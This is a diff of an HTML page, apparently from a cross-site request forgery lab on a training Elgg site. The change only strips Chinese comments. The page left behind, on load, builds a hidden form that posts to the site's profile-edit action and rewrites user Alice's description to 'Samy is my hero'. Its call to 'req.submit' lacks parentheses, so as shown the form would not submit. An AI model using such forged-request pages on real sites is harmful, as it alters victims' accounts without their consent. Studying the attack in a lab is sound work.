@@ -7,13 +7,13 @@
   </body>
   <script>
     function send_post_req(){
-      // 创建表单元素
+
       var req = document.createElement("form");
 
       var url = "http://www.csrflabelgg.com/action/profile/edit";
       var content;
       content += "<input type='hidden' name='name' value='Alice'>";
-      // 个人主页描述
+
       content += "<input type='hidden' name='description' value='Samy is my hero'>"
       content += "<input type='hidden' name='accesslevel[description]' value='2'>";
 
@@ -35,22 +35,22 @@
       content += "<input type='hidden' name='accesslevel[twitter]' value='2'>";
       content += "<input type='hidden' name='website' value=''>";
       content += "<input type='hidden' name='accesslevel[website]' value='2'>";
-      // Alice的GUID
+
       content += "<input type='hidden' name='guid' value='42'>";
 
 
-      // 修改表单元素信息
+
       req.action = url;
       req.innerHTML = content;
       req.target = "_self";
-      req.method = "post";  // POST请求
+      req.method = "post";  
 
-      // 将创建的表单元素添加到文档的body中,用于后续提交表单
+
       document.body.appendChild(req);
-      // 提交表单
+
       req.submit;
     }
-    // 页面加载的时候运行
+
     window.onload = function() { send_post_req(); }
   </script>
 </html>
